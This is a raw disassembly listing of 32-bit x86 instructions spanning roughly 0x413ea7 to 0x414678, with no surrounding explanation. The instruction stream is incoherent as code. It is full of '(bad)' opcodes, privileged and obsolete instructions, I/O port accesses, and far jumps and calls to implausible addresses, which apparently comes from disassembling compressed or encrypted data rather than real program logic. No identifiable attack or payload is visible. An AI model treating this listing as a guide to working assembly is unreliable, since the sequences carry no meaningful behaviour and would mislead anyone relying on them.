  413ea7:	mov    cl,0x52
  413ea9:	push   ebx
  413eaa:	daa    
  413eab:	pusha  
  413eac:	fnsetpm(287 only) 
  413eae:	retf   
  413eaf:	mov    DWORD PTR ds:0x40c343f4,ebp
  413eb5:	mov    bl,ch
  413eb7:	jns    0x413e47
  413eb9:	fmul   QWORD PTR [esi]
  413ebb:	sub    al,0x13
  413ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ebe:	std    
  413ebf:	lds    edx,FWORD PTR [eax+0x13]
  413ec2:	nop
  413ec3:	dec    ecx
  413ec4:	or     al,0xad
  413ec6:	lods   eax,DWORD PTR ds:[esi]
  413ec7:	enter  0x5de7,0x5f
  413ecb:	shl    DWORD PTR [ecx],cl
  413ecd:	dec    eax
  413ece:	(bad)  
  413ecf:	pop    ebx
  413ed0:	mov    bl,dh
  413ed2:	xor    ebx,edx
  413ed4:	xchg   esp,eax
  413ed5:	fsub   QWORD PTR [esi]
  413ed7:	aam    0x43
  413ed9:	adc    bl,BYTE PTR [ecx-0x6d]
  413edc:	(bad)  
  413edd:	mov    esp,DWORD PTR [eax+0x1b991f62]
  413ee3:	jg     0x413eb1
  413ee5:	pop    esp
  413ee6:	arpl   bx,cx
  413ee8:	add    al,BYTE PTR [ebx+0x17b33631]
  413eee:	fs pusha 
  413ef0:	or     DWORD PTR [edx],ecx
  413ef2:	inc    ebp
  413ef3:	xor    eax,0xa73589cd
  413ef8:	out    dx,al
  413ef9:	xor    al,0x26
  413efb:	push   0x33
  413efd:	wbinvd 
  413eff:	pushf  
  413f00:	inc    edi
  413f01:	adc    edi,ebp
  413f03:	and    eax,0xe9c2cf0
  413f08:	outs   dx,BYTE PTR ds:[esi]
  413f09:	fld    QWORD PTR [eax]
  413f0b:	(bad)  
  413f0d:	call   0xcde17f42
  413f12:	aad    0x4f
  413f14:	jg     0x413ed9
  413f16:	add    ebx,DWORD PTR [ecx+0x59017244]
  413f1c:	popa   
  413f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f1e:	or     DWORD PTR [ebp-0x2d],ebp
  413f21:	jl     0x413ef6
  413f23:	fcomp  QWORD PTR [esi+0x24]
  413f26:	mov    edi,0x6ca14567
  413f2b:	mov    ch,0x19
  413f2d:	mov    al,ds:0x8beb4efc
  413f32:	add    DWORD PTR [edi],edi
  413f34:	sbb    eax,0xae6eff89
  413f39:	mov    bl,0xc4
  413f3b:	dec    edi
  413f3c:	adc    eax,0x2e2dd082
  413f41:	out    dx,al
  413f42:	sbb    dl,0x2a
  413f45:	xor    dh,BYTE PTR [edi+0x6c]
  413f48:	jno    0x413f6f
  413f4a:	imul   ebp,DWORD PTR [ebp+0x1c],0xffffffe1
  413f4e:	push   edi
  413f4f:	rcl    BYTE PTR [ecx-0x13],cl
  413f52:	inc    ebp
  413f53:	popf   
  413f54:	fmul   DWORD PTR [eax]
  413f56:	mov    esi,0x529d5f48
  413f5b:	inc    esp
  413f5c:	das    
  413f5d:	loope  0x413fc9
  413f5f:	call   0x1b5d:0x73cd98e8
  413f66:	int3   
  413f67:	mov    bh,0x25
  413f69:	sbb    ch,BYTE PTR [esp+eax*4+0x18]
  413f6d:	cmp    eax,0xd46fd66
  413f72:	mov    ah,0xa0
  413f74:	mov    ds:0x1d9d3fb1,al
  413f79:	jmp    0xe965:0xc7c25dd
  413f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f81:	nop
  413f82:	mov    edx,0x288ba439
  413f87:	sqrtps xmm7,xmm3
  413f8a:	adc    ah,dh
  413f8c:	cld    
  413f8d:	pop    ebp
  413f8e:	sub    bl,BYTE PTR [esi+0x7ea4347b]
  413f94:	adc    ah,BYTE PTR [edx+0x1289fb85]
  413f9a:	test   eax,0x52663937
  413f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fa0:	adc    al,ah
  413fa2:	mov    ds:0x4cd7a074,al
  413fa7:	test   BYTE PTR [edi+0x4c99d73e],ah
  413fad:	mov    ds:0x5532c130,eax
  413fb2:	mov    ecx,0x777c9a7b
  413fb7:	hlt    
  413fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fb9:	outs   dx,BYTE PTR ds:[esi]
  413fba:	clc    
  413fbb:	test   dl,0x9c
  413fbe:	iret   
  413fbf:	or     bl,BYTE PTR [ecx-0x32958df0]
  413fc5:	adc    ah,BYTE PTR cs:[ecx-0x76ac331e]
  413fcc:	mov    edx,0x78e889e3
  413fd1:	or     eax,0x496c9486
  413fd6:	pop    edx
  413fd7:	or     al,0xb9
  413fd9:	add    bl,BYTE PTR [ebx]
  413fdb:	inc    ecx
  413fdc:	push   cs
  413fdd:	mov    ch,0x44
  413fdf:	popa   
  413fe0:	arpl   WORD PTR [esi+0x2f],bx
  413fe3:	mov    WORD PTR [edx-0x6cf0b235],cs
  413fe9:	dec    esp
  413fea:	ins    BYTE PTR es:[edi],dx
  413feb:	pop    edi
  413fec:	adc    edx,DWORD PTR [ecx]
  413fee:	and    al,0x76
  413ff0:	xchg   ebx,eax
  413ff1:	mov    eax,0x46fe7b0e
  413ff6:	int    0x72
  413ff8:	mov    ds:0xe8815001,al
  413ffd:	outs   dx,DWORD PTR ds:[esi]
  413ffe:	mov    edx,0xba574392
  414003:	fs fs in al,0x6d
  414007:	in     eax,dx
  414008:	push   cs
  414009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41400a:	repz or bl,BYTE PTR [edx-0x63]
  41400e:	push   ds
  41400f:	lods   eax,DWORD PTR ds:[esi]
  414010:	(bad)  
  414011:	cli    
  414012:	jmp    0x909c5d7e
  414017:	push   0x23
  414019:	push   edx
  41401a:	and    eax,0xf75643be
  41401f:	adc    eax,0x713a3dbd
  414024:	je     0x41407f
  414026:	std    
  414027:	pushf  
  414028:	sub    BYTE PTR [edx-0x21],bl
  41402b:	mov    si,dx
  41402e:	mov    ebx,0x44e37c7b
  414033:	xor    eax,0x5500d0f8
  414038:	lds    esp,FWORD PTR [esi+eiz*2+0x71]
  41403c:	clc    
  41403d:	jnp    0x414045
  41403f:	mov    al,ds:0xb349a9ae
  414044:	loopne 0x414022
  414046:	sub    al,0x54
  414048:	ret    
  414049:	fiadd  DWORD PTR [esi-0x3b5084a2]
  41404f:	mov    cl,0x3
  414051:	dec    ebp
  414052:	xchg   DWORD PTR [bx],eax
  414055:	sub    al,BYTE PTR ds:0x9591334c
  41405b:	jno    0x414050
  41405d:	ja     0x41400a
  41405f:	inc    edx
  414060:	mov    ch,0x9
  414062:	out    dx,al
  414063:	inc    edi
  414064:	mov    ds:0xb6669a96,al
  414069:	mov    ds:0x45973f2c,al
  41406e:	sub    al,0x26
  414070:	popf   
  414071:	push   esi
  414072:	dec    esi
  414073:	mov    ds:0x1521615a,eax
  414078:	(bad)  
  414079:	push   ss
  41407a:	inc    edi
  41407b:	fcmovnbe st,st(5)
  41407d:	addr16 pusha 
  41407f:	pop    es
  414080:	adc    ebx,esi
  414082:	gs loope 0x414081
  414085:	cmp    al,0xd
  414087:	imul   edi,DWORD PTR [eax+0x65f25c05],0x76d8e9ce
  414091:	test   DWORD PTR [esi],0x491b55b7
  414097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414098:	shl    dh,1
  41409a:	fild   WORD PTR [edi]
  41409c:	add    ebp,DWORD PTR [edi]
  41409e:	pop    eax
  41409f:	push   ecx
  4140a0:	xchg   ebp,eax
  4140a1:	sbb    ecx,DWORD PTR [ebp+0x3e91fe62]
  4140a7:	jp     0x41408f
  4140a9:	mov    ecx,0xd3364673
  4140ae:	scas   eax,DWORD PTR es:[edi]
  4140af:	push   0x51c4cfbe
  4140b4:	and    al,0x66
  4140b6:	sbb    al,0xa3
  4140b8:	mov    DWORD PTR [esp+edx*4-0x3],eax
  4140bc:	ss mov ?,edx
  4140bf:	cmp    eax,0xe5992bf6
  4140c4:	retf   0x450b
  4140c7:	xchg   esp,eax
  4140c9:	rcl    edx,0x3c
  4140cc:	fsubr  DWORD PTR [edx+ebx*4]
  4140cf:	sbb    DWORD PTR [ebp-0x5c5a757e],edi
  4140d5:	sub    al,0xb2
  4140d7:	and    cl,bl
  4140d9:	add    cl,BYTE PTR [ebx]
  4140db:	mov    cl,BYTE PTR [eax+0x1eb10fd3]
  4140e1:	pushf  
  4140e2:	adc    eax,0xb9903cdb
  4140e7:	xchg   ebx,eax
  4140e8:	sub    DWORD PTR [esi-0x3f5e56e7],esi
  4140ee:	add    BYTE PTR [edi-0x60],0x9d
  4140f2:	cmp    BYTE PTR [esi+edi*1+0x290dd4d],0x40
  4140fa:	mov    al,0x52
  4140fc:	add    eax,0x27fcb591
  414101:	cdq    
  414102:	scas   al,BYTE PTR es:[edi]
  414103:	and    ecx,eax
  414105:	rcr    BYTE PTR [edx+0x42],1
  414108:	repz aam 0x44
  41410b:	jo     0x4140dd
  41410d:	mov    esp,0x9b47a43f
  414112:	out    0xf9,al
  414114:	(bad)  
  414116:	imul   esp,DWORD PTR [edx],0x9ed44dfb
  41411c:	inc    ebp
  41411d:	pop    ebp
  41411e:	xchg   ebp,eax
  41411f:	push   cs
  414120:	pop    edx
  414121:	dec    edi
  414122:	cmp    BYTE PTR [edx],bl
  414124:	leave  
  414125:	sbb    esp,esi
  414127:	out    dx,eax
  414128:	xchg   ebx,eax
  414129:	xchg   ebp,eax
  41412a:	mov    edi,0xe6cc397
  41412f:	test   DWORD PTR [ebp-0xe],0x137c6c00
  414136:	shl    ebp,0x93
  414139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41413a:	jae    0x41411d
  41413c:	sahf   
  41413d:	in     eax,dx
  41413e:	(bad)  
  41413f:	sbb    eax,0x9388170
  414144:	sub    bl,BYTE PTR [edi-0x634c06bd]
  41414a:	or     edx,ecx
  41414c:	adc    ecx,esp
  41414e:	jnp    0x4140d1
  414150:	aas    
  414151:	or     eax,0x48018509
  414156:	and    BYTE PTR [edx+ebp*8-0x338ba1dd],dl
  41415d:	cdq    
  41415e:	mov    ch,0x2e
  414160:	sub    al,0xc
  414162:	int    0xec
  414164:	popf   
  414165:	ins    DWORD PTR es:[edi],dx
  414166:	enter  0x39d7,0xf
  41416a:	mov    cl,0xfc
  41416c:	mov    ah,0xc5
  41416e:	and    edx,DWORD PTR ds:0x19c45055
  414174:	rcl    BYTE PTR [esi],cl
  414176:	into   
  414177:	imul   ebp,DWORD PTR [ebx-0x68bc5ac4],0xffffffee
  41417e:	mov    bh,0xc0
  414180:	push   ecx
  414181:	ins    WORD PTR es:[edi],dx
  414183:	adc    BYTE PTR [edx+0x1a],dh
  414186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414187:	ror    esi,1
  414189:	mov    dl,BYTE PTR ds:0xe8f4bb5c
  41418f:	and    BYTE PTR [ebx],dh
  414191:	xlat   BYTE PTR ds:[ebx]
  414192:	pop    es
  414193:	and    ch,BYTE PTR [esi-0x157ccf53]
  414199:	hlt    
  41419a:	mov    dl,0xcc
  41419c:	(bad)  
  41419d:	imul   ebp,DWORD PTR [ebp+0x73],0x4cc3c9e0
  4141a4:	(bad)  
  4141a5:	scas   eax,DWORD PTR es:[edi]
  4141a6:	inc    edi
  4141a7:	pop    ebp
  4141a8:	sbb    BYTE PTR [edi-0x646a6a3d],bh
  4141ae:	outs   dx,DWORD PTR ds:[esi]
  4141af:	pop    ebp
  4141b0:	sbb    dh,BYTE PTR [edx-0x6c]
  4141b3:	pop    ss
  4141b4:	jbe    0x4141f1
  4141b6:	out    dx,al
  4141b7:	mov    WORD PTR [edx],cs
  4141b9:	sub    eax,0xfcc11a08
  4141be:	dec    edx
  4141bf:	jge    0x414180
  4141c1:	ror    dh,0x51
  4141c4:	hlt    
  4141c5:	jp     0x414198
  4141c7:	lock rcr eax,cl
  4141ca:	(bad)  
  4141cb:	xchg   ecx,eax
  4141cc:	inc    ebx
  4141cd:	push   0xffffffb4
  4141cf:	dec    edi
  4141d0:	sub    al,0x76
  4141d2:	and    cl,0xb
  4141d5:	inc    ebx
  4141d6:	cdq    
  4141d7:	adc    eax,0x752f5e5d
  4141dc:	je     0x414232
  4141de:	(bad)  
  4141df:	lods   eax,DWORD PTR ds:[esi]
  4141e0:	mov    ecx,eax
  4141e2:	sub    al,0xde
  4141e4:	inc    esi
  4141e5:	(bad)  
  4141e6:	rcl    DWORD PTR [ecx],cl
  4141e8:	jl     0x414171
  4141ea:	mov    edi,0x38bde4cc
  4141ef:	ret    
  4141f0:	cli    
  4141f1:	inc    esp
  4141f2:	mov    ebx,0x2ebd5618
  4141f7:	jmp    DWORD PTR [esi-0x17f527b7]
  4141fd:	cmc    
  4141fe:	sbb    esi,DWORD PTR [esi+0x57ce9964]
  414204:	(bad)  
  414205:	scas   al,BYTE PTR es:[edi]
  414206:	pop    esp
  414207:	clc    
  414208:	fs ins BYTE PTR es:[edi],dx
  41420a:	mov    ds:0x293afc73,eax
  41420f:	and    ch,BYTE PTR [eax+0x15]
  414212:	pop    ds
  414213:	adc    al,0x48
  414215:	mov    ss,WORD PTR [edx+0x77c616aa]
  41421b:	sbb    eax,0xe2c82c4d
  414220:	cmp    BYTE PTR [ebx+0x5fdeb72b],al
  414226:	mov    ebp,0x6818247d
  41422b:	cmp    edi,DWORD PTR [edi-0x5879bd50]
  414231:	jecxz  0x414258
  414233:	add    bh,cl
  414235:	mov    ch,0x6c
  414237:	test   al,0xa3
  414239:	loop   0x4141c4
  41423b:	popf   
  41423c:	int    0x49
  41423e:	mov    dl,0x7c
  414240:	xor    ebx,DWORD PTR [ebp+0x3582655a]
  414246:	aaa    
  414247:	rol    DWORD PTR [ecx+0x65],cl
  41424a:	mov    dh,0xc
  41424c:	add    eax,0xcfe2ea62
  414251:	xor    BYTE PTR [ecx],cl
  414253:	dec    ecx
  414254:	mov    ebp,0x20a9f91d
  414259:	(bad)  
  41425a:	rcr    bh,1
  41425c:	sbb    eax,0xb48a2a32
  414261:	lods   eax,DWORD PTR ds:[esi]
  414262:	add    al,0x9a
  414264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414265:	mov    dl,bh
  414267:	in     eax,dx
  414268:	mov    gs,WORD PTR [edi]
  41426a:	sbb    ecx,DWORD PTR [esi+0x5b]
  41426d:	addr16 push ss
  41426f:	rol    DWORD PTR ss:[edi+0x17],1
  414273:	ss lahf 
  414275:	pop    esp
  414276:	adc    ah,bl
  414278:	jmp    0x4142e3
  41427a:	call   0x9fa2689f
  41427f:	inc    esp
  414280:	(bad)  
  414281:	mov    esi,0xdace7f05
  414286:	adc    esi,edx
  414288:	jl     0x414281
  41428a:	pop    edx
  41428b:	mov    BYTE PTR [ecx],ch
  41428d:	mov    bh,0x4b
  41428f:	leave  
  414290:	shl    DWORD PTR [edx+0x67],cl
  414293:	cld    
  414294:	add    ecx,DWORD PTR [ebx-0x251fb637]
  41429a:	(bad)  
  41429b:	mov    edi,0xa362836f
  4142a0:	xchg   ebp,eax
  4142a1:	repnz and dh,BYTE PTR [esi-0x6c]
  4142a5:	neg    DWORD PTR [edi-0x52]
  4142a8:	mov    dl,0x87
  4142aa:	rol    bh,1
  4142ac:	add    al,0x80
  4142ae:	jne    0x414241
  4142b0:	imul   BYTE PTR gs:[eax-0x25]
  4142b4:	jle    0x41426b
  4142b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142b7:	xchg   ebx,eax
  4142b8:	jb     0x4142eb
  4142ba:	jecxz  0x4142e6
  4142bc:	mov    edi,0xdaf422c9
  4142c1:	call   0x7ec1289c
  4142c6:	sbb    eax,0xf096e9cd
  4142cb:	ret    0xbd16
  4142ce:	ja     0x414339
  4142d0:	or     al,0x34
  4142d2:	mov    bh,BYTE PTR [edi]
  4142d4:	push   ebx
  4142d5:	mov    eax,ds:0x2e4fb948
  4142da:	(bad)  
  4142db:	int3   
  4142dc:	add    BYTE PTR [ecx],0xf4
  4142df:	out    0xe6,eax
  4142e1:	(bad)  
  4142e2:	sub    bl,BYTE PTR [eax+0x20]
  4142e5:	xor    eax,0xcafe1e36
  4142ea:	in     al,0x35
  4142ec:	cli    
  4142ed:	pop    edx
  4142ee:	outs   dx,DWORD PTR ds:[esi]
  4142ef:	mov    esi,0xa6507b2c
  4142f4:	jbe    0x414355
  4142f6:	sti    
  4142f7:	pop    edi
  4142f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f9:	fwait
  4142fa:	int3   
  4142fb:	cwde   
  4142fc:	inc    DWORD PTR [eax]
  4142fe:	jle    0x4142c3
  414300:	popf   
  414301:	xor    al,0xfa
  414303:	jp     0x41431e
  414305:	mov    WORD PTR [edi+0x2503f42a],cs
  41430b:	mov    ecx,0xac37cfd5
  414310:	neg    BYTE PTR [eax+0x6ddd71c9]
  414316:	jb     0x414329
  414318:	pop    ss
  414319:	adc    dl,bl
  41431b:	adc    edi,DWORD PTR ss:[ebp+0x79a447ed]
  414322:	pusha  
  414323:	(bad)  
  414325:	fisub  WORD PTR [ebx+eiz*4]
  414328:	add    eax,0x6ad2c43c
  41432d:	mov    ds:0x678f30d6,eax
  414332:	stc    
  414333:	cwde   
  414334:	sti    
  414335:	mov    edx,0xf2e1f4c2
  41433a:	fdiv   DWORD PTR [ebx+0x5ae83010]
  414340:	mov    BYTE PTR [ecx-0x773a37df],al
  414346:	mov    ah,0xa0
  414348:	aam    0xc
  41434a:	js     0x414371
  41434c:	push   ds
  41434d:	lds    ebp,FWORD PTR [eax+0x60]
  414350:	loope  0x414387
  414352:	retf   0x421e
  414355:	rcr    DWORD PTR [esp+eiz*8-0x34],cl
  414359:	cmp    ah,BYTE PTR gs:[eax]
  41435c:	rcr    DWORD PTR [edi+0xc9aa076],1
  414362:	mov    bh,0x83
  414364:	sub    eax,0x6c792b9b
  414369:	mov    ds,WORD PTR [ebx-0x79]
  41436c:	mov    ah,0x5
  41436e:	inc    edx
  41436f:	les    ecx,FWORD PTR ds:0xefec95f2
  414375:	sub    eax,0x1c50d814
  41437a:	into   
  41437b:	iret   
  41437c:	sbb    DWORD PTR [esi],ebp
  41437e:	cli    
  41437f:	repz mov ecx,0x51fcd19a
  414385:	popa   
  414386:	inc    esp
  414387:	(bad)  
  414388:	lds    esp,FWORD PTR [esi-0x36]
  41438b:	push   eax
  41438c:	das    
  41438d:	adc    DWORD PTR [edi+0x6f757917],ebp
  414393:	cwde   
  414394:	mov    ecx,0x7aa1f6ca
  414399:	sbb    DWORD PTR [edi],0x1b23ad81
  41439f:	push   ss
  4143a0:	stc    
  4143a1:	mov    bl,0xa4
  4143a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a4:	adc    eax,0x99d3da13
  4143a9:	sti    
  4143aa:	and    BYTE PTR [edx-0x5f7722b2],ch
  4143b0:	push   esp
  4143b1:	pop    esp
  4143b2:	xor    bl,BYTE PTR [ecx+0x15]
  4143b5:	stos   DWORD PTR es:[edi],eax
  4143b6:	test   al,0x8f
  4143b8:	mov    eax,ds:0xf535e7b6
  4143bd:	dec    ebx
  4143be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143bf:	push   edi
  4143c0:	pop    ss
  4143c1:	enter  0x6884,0x46
  4143c5:	or     eax,0xcb337ce1
  4143ca:	sub    ah,BYTE PTR [eax-0xca907e0]
  4143d0:	test   eax,0x1b794360
  4143d5:	jg     0x4143d5
  4143d7:	pop    ecx
  4143d8:	into   
  4143d9:	fcomp  DWORD PTR ds:0xd7111ad6
  4143df:	in     eax,0xe1
  4143e1:	(bad)  
  4143e2:	rol    dh,0x6e
  4143e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143e6:	mov    edi,0x1146975f
  4143eb:	mov    esi,0xe16bb42c
  4143f0:	sub    ch,BYTE PTR fs:[ebp+edi*4-0xa]
  4143f5:	fist   DWORD PTR [ebx+esi*4+0x40c27077]
  4143fc:	dec    edi
  4143fd:	not    DWORD PTR [ecx]
  4143ff:	aad    0xd9
  414401:	cwde   
  414402:	sbb    bh,BYTE PTR [esi-0xfbee392]
  414408:	and    BYTE PTR [ebx+0x3d130286],0xa0
  41440f:	clc    
  414410:	and    eax,0x9f4c4034
  414415:	iret   
  414416:	fbstp  TBYTE PTR [esi]
  414418:	pop    es
  414419:	outs   dx,BYTE PTR ds:[esi]
  41441a:	cdq    
  41441b:	jo     0x4143f5
  41441d:	or     dl,BYTE PTR [ebp-0x29add500]
  414423:	ret    
  414424:	adc    dl,BYTE PTR [edi-0xcd163d3]
  41442a:	loope  0x414437
  41442c:	nop
  41442d:	aaa    
  41442e:	inc    edx
  41442f:	sbb    eax,0xffffffd9
  414432:	in     eax,dx
  414433:	adc    al,BYTE PTR [esi-0xf]
  414436:	push   edi
  414437:	or     al,0x4c
  414439:	int    0x59
  41443b:	lock mov esi,0xc55a8ae0
  414441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414442:	pcmpgtw mm1,QWORD PTR [esi+0x5d0d2301]
  414449:	mov    ch,0x8
  41444b:	and    ebp,edi
  41444d:	lods   al,BYTE PTR ds:[esi]
  41444e:	sub    DWORD PTR [eax-0x4d],esi
  414451:	inc    eax
  414452:	ins    BYTE PTR es:[edi],dx
  414453:	inc    edx
  414454:	pushf  
  414455:	gs dec ebp
  414457:	sbb    BYTE PTR [ecx],ch
  414459:	inc    esi
  41445a:	rcl    DWORD PTR [ebx+0x10],1
  41445d:	test   BYTE PTR [eax],0xa6
  414460:	sub    eax,0x8125dd26
  414465:	(bad)  
  414466:	test   BYTE PTR [esi],0xf0
  414469:	in     al,dx
  41446a:	ds sub eax,0x8205907f
  414470:	imul   ebx,DWORD PTR [edi-0x16b1920],0xffffffc6
  414477:	neg    eax
  414479:	sub    ecx,ecx
  41447b:	popf   
  41447c:	into   
  41447d:	xor    al,0x18
  41447f:	and    DWORD PTR [ebp+0x58862360],0x22
  414486:	pop    ebp
  414487:	ja     0x41444b
  414489:	loope  0x414444
  41448b:	ja     0x4144d0
  41448d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41448e:	and    al,0xaa
  414490:	ret    
  414491:	add    al,0x70
  414493:	mov    dl,0xe8
  414495:	int3   
  414496:	xor    eax,0x696c582c
  41449b:	aas    
  41449c:	pushw  ss
  41449e:	mov    BYTE PTR [eax-0x210cd831],dh
  4144a4:	or     BYTE PTR [edi-0x49],dl
  4144a7:	or     DWORD PTR [esi+0x5],esp
  4144aa:	mov    ch,0xbf
  4144ac:	popf   
  4144ad:	adc    BYTE PTR [ecx],0xef
  4144b0:	mov    ch,0x86
  4144b2:	jnp    0x4144d2
  4144b4:	cmp    BYTE PTR [eax-0x40cf2a7c],bh
  4144ba:	sbb    al,0x4c
  4144bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144bd:	inc    ebx
  4144be:	clc    
  4144bf:	jg     0x4144fd
  4144c1:	shl    DWORD PTR [ecx+edi*1+0x22932c2d],cl
  4144c8:	imul   ecx,DWORD PTR ds:0x3b9943fb,0xffffff8c
  4144cf:	jl     0x4144d4
  4144d1:	cmp    esi,DWORD PTR [ebx]
  4144d3:	mov    edi,0xf543606b
  4144d8:	inc    eax
  4144d9:	add    cl,BYTE PTR [ebx-0x69715a2c]
  4144df:	mov    edi,0x7adb7476
  4144e4:	xor    DWORD PTR cs:[esi+0x58],ebx
  4144e8:	add    ebx,DWORD PTR [esi]
  4144ea:	pop    esi
  4144eb:	icebp  
  4144ec:	(bad)  
  4144ed:	fistp  QWORD PTR [eax-0x796a4fa0]
  4144f3:	adc    ebp,DWORD PTR [ecx+0x13]
  4144f6:	out    0x23,eax
  4144f8:	aam    0xf8
  4144fa:	xor    eax,DWORD PTR [edi-0x1a7f1b30]
  414500:	push   esp
  414501:	pop    ebx
  414502:	rcr    DWORD PTR [ecx+0x63],0x8d
  414506:	(bad)  
  414507:	(bad)  
  414509:	call   0xb640:0xb45570a4
  414510:	lds    ebp,FWORD PTR [ebp+ebx*8+0x5d]
  414514:	mov    dh,0xf9
  414516:	push   ebx
  414517:	fldcw  WORD PTR [edi+ebp*2]
  41451a:	jnp    0x41450f
  41451c:	and    eax,DWORD PTR [esi-0x46]
  41451f:	sub    ebx,ebp
  414521:	dec    edi
  414522:	mov    eax,DWORD PTR [edx-0x520ebf13]
  414528:	ds or  bl,0x4f
  41452c:	jmp    0xe60f288d
  414531:	loope  0x4144b8
  414533:	fwait
  414534:	pop    edi
  414535:	adc    al,0x3b
  414537:	xchg   esi,eax
  414538:	sub    DWORD PTR [ecx*1+0x75a54137],esp
  41453f:	jbe    0x414554
  414541:	ficom  DWORD PTR [ecx]
  414543:	mov    al,BYTE PTR [eax-0x5f]
  414546:	xchg   edx,eax
  414547:	fidiv  DWORD PTR [ecx-0x51]
  41454a:	popa   
  41454b:	inc    ebp
  41454c:	scas   al,BYTE PTR es:[edi]
  41454d:	in     eax,0xeb
  41454f:	mov    eax,ds:0x7e4fa588
  414554:	aad    0x8a
  414556:	addr16 daa 
  414558:	fs add eax,ecx
  41455b:	cmc    
  41455c:	push   edx
  41455d:	push   eax
  41455e:	jbe    0x414532
  414560:	mov    al,0x83
  414562:	pop    ss
  414563:	out    0xed,al
  414565:	pop    ecx
  414566:	cmp    eax,0x8d0a3d76
  41456b:	cmp    DWORD PTR [ebx+ebp*1],eax
  41456e:	lahf   
  41456f:	aam    0x6e
  414571:	mov    al,0x3b
  414573:	jbe    0x41453e
  414575:	mov    bh,0x0
  414577:	mov    al,0xff
  414579:	add    BYTE PTR [edi],al
  41457b:	dec    edx
  41457c:	cdq    
  41457d:	cwde   
  41457e:	out    dx,eax
  41457f:	aam    0xf4
  414581:	sbb    eax,edx
  414583:	or     eax,0x591b7f02
  414588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414589:	in     eax,dx
  41458a:	addr16 std 
  41458c:	aaa    
  41458d:	in     al,0x3f
  41458f:	enter  0x698d,0x54
  414593:	push   ds
  414594:	pop    ss
  414595:	addr16 jno 0x41460f
  414598:	cwde   
  414599:	adc    ch,BYTE PTR [ebx-0x3b]
  41459c:	cmp    ch,BYTE PTR [ebp+ebx*1-0x7a]
  4145a0:	sbb    ah,bh
  4145a2:	jecxz  0x414532
  4145a4:	lahf   
  4145a5:	push   cs
  4145a6:	iret   
  4145a7:	push   ebx
  4145a8:	mov    eax,ds:0x49dd0496
  4145ad:	inc    esp
  4145ae:	or     al,0x45
  4145b0:	(bad)  
  4145b1:	fmul   DWORD PTR [edx]
  4145b3:	adc    eax,0x5d0e181c
  4145b8:	movnti DWORD PTR [ecx+0x33abdd0b],edi
  4145bf:	adc    eax,0x2d2f1b7f
  4145c4:	pop    ds
  4145c5:	sub    eax,0x812b577
  4145ca:	inc    ebx
  4145cb:	inc    edi
  4145cc:	mov    bl,0x92
  4145ce:	cwde   
  4145cf:	sub    dh,BYTE PTR [ebp-0x7f]
  4145d2:	xchg   ecx,eax
  4145d3:	ror    BYTE PTR [eax],cl
  4145d5:	mov    dh,0x88
  4145d7:	pop    esp
  4145d8:	and    al,BYTE PTR [esi]
  4145da:	fwait
  4145db:	lock test BYTE PTR [esi],cl
  4145de:	jl     0x41460d
  4145e0:	cli    
  4145e1:	dec    ebx
  4145e2:	or     eax,0x2effbc7e
  4145e7:	xchg   ebx,eax
  4145e8:	out    dx,al
  4145e9:	and    ecx,DWORD PTR [edx-0x6eb8321]
  4145ef:	fdiv   st,st(0)
  4145f1:	fild   WORD PTR [edx-0x6053e67c]
  4145f7:	jmp    0xd1c2:0xf68768fa
  4145fe:	jb     0x414583
  414600:	inc    ebx
  414601:	cs mov bh,0x2b
  414604:	scas   al,BYTE PTR es:[edi]
  414605:	jb     0x4145c7
  414607:	retf   0xc128
  41460a:	outs   dx,BYTE PTR ds:[esi]
  41460b:	imul   ebx,edi,0xffffffef
  41460e:	cmp    edi,DWORD PTR [esi-0x75]
  414611:	pushf  
  414612:	in     al,dx
  414613:	int    0x4
  414615:	cmp    eax,0x754a7d68
  41461a:	scas   eax,DWORD PTR es:[edi]
  41461b:	ins    DWORD PTR es:[edi],dx
  41461c:	add    DWORD PTR [ebx+0x34],esp
  41461f:	mov    dl,0xc6
  414621:	xchg   BYTE PTR [eax],dh
  414623:	mov    ebx,0x6d840063
  414628:	shl    BYTE PTR [esi],cl
  41462a:	push   ebp
  41462b:	or     DWORD PTR [ebp+0x78744e98],edi
  414631:	icebp  
  414632:	mov    cl,0xfc
  414634:	mov    ah,0xe9
  414636:	cdq    
  414637:	fwait
  414638:	inc    esp
  414639:	cli    
  41463a:	sub    DWORD PTR [eax],ecx
  41463c:	rcl    BYTE PTR [ecx],0x14
  41463f:	xchg   esp,eax
  414640:	pop    ss
  414641:	into   
  414642:	(bad)  
  414643:	aad    0x93
  414645:	mov    al,ch
  414647:	xor    dh,BYTE PTR [edi-0x2e]
  41464a:	test   dh,cl
  41464c:	mov    edi,0x63120545
  414651:	fadd   st(7),st
  414653:	cs mov ch,0x6a
  414656:	or     cl,BYTE PTR [eax+0x0]
  414659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41465a:	aad    0x91
  41465c:	xchg   esp,eax
  41465d:	dec    ebp
  41465e:	sub    dl,bl
  414660:	stos   BYTE PTR es:[edi],al
  414661:	pop    edx
  414662:	add    dh,dh
  414664:	data16 je 0x414636
  414667:	jmp    0xc82db61b
  41466c:	dec    ebx
  41466d:	scas   al,BYTE PTR es:[edi]
  41466e:	add    eax,DWORD PTR [edi+0x6a]
  414671:	xlat   BYTE PTR ds:[ebx]
  414672:	jp     0x41469a
  414674:	int3   
  414675:	ret    0x7a84
  414678:	sbb    BYTE PTR [edx+0x63],al
